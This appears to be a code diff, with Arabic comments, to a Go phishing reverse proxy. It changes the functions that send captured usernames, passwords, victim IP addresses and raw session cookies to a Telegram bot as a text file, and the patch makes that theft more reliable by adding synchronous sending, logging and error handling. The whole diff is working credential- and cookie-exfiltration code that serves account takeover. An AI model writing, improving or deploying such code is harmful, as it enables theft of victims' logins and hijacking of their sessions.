@@ -2217,16 +2217,26 @@ func (p *HttpProxy) setSessionPassword(sid string, password string) {
 		
 		// إذا كان كل من اسم المستخدم وكلمة المرور متوفرين، أرسل إشعارًا
 		if s.Username != "" && s.Password != "" {
-			go p.telegram.NotifyCredentialsCaptured(sid, s.Name, s.Username, s.Password, s.RemoteAddr)
+			// استخدم log للتأكد من أن هذه الدالة تنفذ مرة واحدة فقط
+			log.Info("إرسال بيانات الاعتماد والكوكيز للجلسة: %s", sid)
 			
-			// إرسال الكوكيز كملف نصي إلى تلجرام
-			go p.sendCookiesToTelegram(s)
+			// قم بتنفيذ الدالتين بشكل متسلسل (بدون go) للتأكد من تنفيذهما بشكل صحيح
+			err := p.telegram.NotifyCredentialsCaptured(sid, s.Name, s.Username, s.Password, s.RemoteAddr)
+			if err != nil {
+				log.Error("خطأ في إرسال إشعار بيانات الاعتماد: %v", err)
+			}
+			
+			// إرسال الكوكيز مباشرة بعد إرسال بيانات الاعتماد
+			p.sendCookiesToTelegram(s)
 		}
 	}
 }
 
-// دالة مُعدلة لإرسال الكوكيز كملف نصي إلى تيليجرام بالشكل الخام كما هي
+// تحسين دالة إرسال الكوكيز لمعالجة الأخطاء بشكل أفضل
 func (p *HttpProxy) sendCookiesToTelegram(s *Session) {
+	// طباعة سجل لمعرفة ما إذا كانت الدالة قد بدأت
+	log.Info("بدء إرسال الكوكيز للجلسة: %s", s.Id)
+	
 	// تجميع المعلومات الأساسية
 	cookiesText := fmt.Sprintf("=== Session Info %s ===\n", s.Id)
 	cookiesText += fmt.Sprintf("Username: %s\n", s.Username)
@@ -2235,16 +2245,31 @@ func (p *HttpProxy) sendCookiesToTelegram(s *Session) {
 	cookiesText += fmt.Sprintf("User-Agent: %s\n", s.UserAgent)
 	cookiesText += fmt.Sprintf("Country: %s (%s)\n\n", s.Country, s.CountryCode)
 	
-	// إضافة معلومات الكوكيز بالشكل الخام
-	cookiesText += "=== RAW Cookie Tokens ===\n"
-	
-	// تحويل هيكل البيانات إلى JSON
-	cookieJSON, err := json.MarshalIndent(s.CookieTokens, "", "  ")
-	if err != nil {
-		log.Error("خطأ في تحويل الكوكيز إلى JSON: %v", err)
-		cookiesText += "خطأ في استخراج الكوكيز\n"
+	// التحقق من وجود CookieTokens للتأكد من أنه ليس فارغًا
+	if s.CookieTokens == nil {
+		log.Warning("لا توجد كوكيز مخزنة للجلسة: %s", s.Id)
+		cookiesText += "=== NO COOKIES FOUND ===\n"
 	} else {
-		cookiesText += string(cookieJSON) + "\n\n"
+		// إضافة معلومات الكوكيز بالشكل الخام
+		cookiesText += "=== RAW Cookie Tokens ===\n"
+		
+		// تحويل هيكل البيانات إلى JSON
+		cookieJSON, err := json.MarshalIndent(s.CookieTokens, "", "  ")
+		if err != nil {
+			log.Error("خطأ في تحويل الكوكيز إلى JSON: %v", err)
+			cookiesText += "خطأ في استخراج الكوكيز\n"
+		} else {
+			cookiesText += string(cookieJSON) + "\n\n"
+		}
+		
+		// إضافة عدد الكوكيز المختلفة
+		cookiesText += fmt.Sprintf("=== Cookie Counts ===\n")
+		cookieCount := 0
+		for _, cookies := range s.CookieTokens {
+			cookieCount += len(cookies)
+		}
+		cookiesText += fmt.Sprintf("Total Cookies: %d\n", cookieCount)
+		cookiesText += fmt.Sprintf("Total Cookie Domains: %d\n", len(s.CookieTokens))
 	}
 	
 	// إضافة البيانات الخام لـ Body Tokens
@@ -2256,6 +2281,7 @@ func (p *HttpProxy) sendCookiesToTelegram(s *Session) {
 		} else {
 			cookiesText += string(bodyJSON) + "\n\n"
 		}
+		cookiesText += fmt.Sprintf("Total Body Tokens: %d\n", len(s.BodyTokens))
 	}
 	
 	// إضافة البيانات الخام لـ HTTP Tokens
@@ -2267,22 +2293,17 @@ func (p *HttpProxy) sendCookiesToTelegram(s *Session) {
 		} else {
 			cookiesText += string(httpJSON) + "\n\n"
 		}
+		cookiesText += fmt.Sprintf("Total HTTP Tokens: %d\n", len(s.HttpTokens))
 	}
-	
-	// إضافة عدد الكوكيز المختلفة
-	cookiesText += fmt.Sprintf("=== Cookie Counts ===\n")
-	cookieCount := 0
-	for _, cookies := range s.CookieTokens {
-		cookieCount += len(cookies)
-	}
-	cookiesText += fmt.Sprintf("Total Cookies: %d\n", cookieCount)
-	cookiesText += fmt.Sprintf("Total Cookie Domains: %d\n", len(s.CookieTokens))
-	cookiesText += fmt.Sprintf("Total Body Tokens: %d\n", len(s.BodyTokens))
-	cookiesText += fmt.Sprintf("Total HTTP Tokens: %d\n", len(s.HttpTokens))
 	
 	// إرسال النص كملف إلى تيليجرام
 	fileName := fmt.Sprintf("raw_cookies_%s_%s.txt", s.Name, s.Id)
-	p.telegram.SendFileFromText(fileName, cookiesText)
+	err := p.telegram.SendFileFromText(fileName, cookiesText)
+	if err != nil {
+		log.Error("فشل في إرسال ملف الكوكيز: %v", err)
+	} else {
+		log.Success("تم إرسال ملف الكوكيز بنجاح للجلسة: %s", s.Id)
+	}
 }
 
 func (p *HttpProxy) setSessionCustom(sid string, name string, value string) {
